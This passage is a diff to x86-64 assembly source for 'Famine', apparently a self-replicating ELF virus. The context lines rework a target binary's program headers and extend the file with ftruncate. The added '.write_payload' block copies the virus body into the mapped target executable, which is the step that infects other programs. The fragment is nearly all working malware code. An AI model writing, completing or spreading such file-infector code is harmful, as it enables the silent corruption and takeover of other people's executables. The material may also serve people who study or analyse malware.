@@ -238,22 +238,17 @@ section .text
                     add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                     jmp .loop_phdr
 
-
                 .end_loop_phdr:
-
 
                     cmp qword VAR(Famine.note_phdr_ptr), 0x0
                     je .close_file
 
-
                     cmp qword VAR(Famine.max_vaddr_end), 0x0
                     je .close_file
-
 
                 .ftruncate:
 
                     ; TRACE_TEXT hello, 11
-
 
                     ; ftruncate(fd_file, file_final_len)
                     mov rdi, VAR(Famine.fd_file)
@@ -287,6 +282,7 @@ section .text
                     mov ecx, dword VAR(Famine.file_final_len)
                     sub ecx, dword VAR(Famine.virus_size)
                     mov [rax+Elf64_Phdr.p_offset], rcx       ; p_offset = file_final_len - virus_size
+                    mov VAR(Famine.virus_offset), rcx
 
                     mov rcx, VAR(Famine.max_vaddr_end)
                     ALIGN rcx
@@ -299,6 +295,14 @@ section .text
 
                     mov qword [rax+Elf64_Phdr.p_align], 0x1000     ; p_align = 0x1000 (4KB)
 
+                .write_payload:
+
+                    mov rsi, VAR(Famine.virus_entry)
+                    mov rdi, VAR(Famine.mmap_ptr)
+                    add rdi, VAR(Famine.virus_offset)
+                    mov ecx, dword VAR(Famine.virus_size)
+                    cld
+                    rep movsb
 
                 .munmap:
                     ;munmap(map_ptr, )
@@ -348,5 +352,7 @@ section .text
         .exit:
             mov rax, SC_EXIT
             syscall
+
+    Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
 
     _finish:
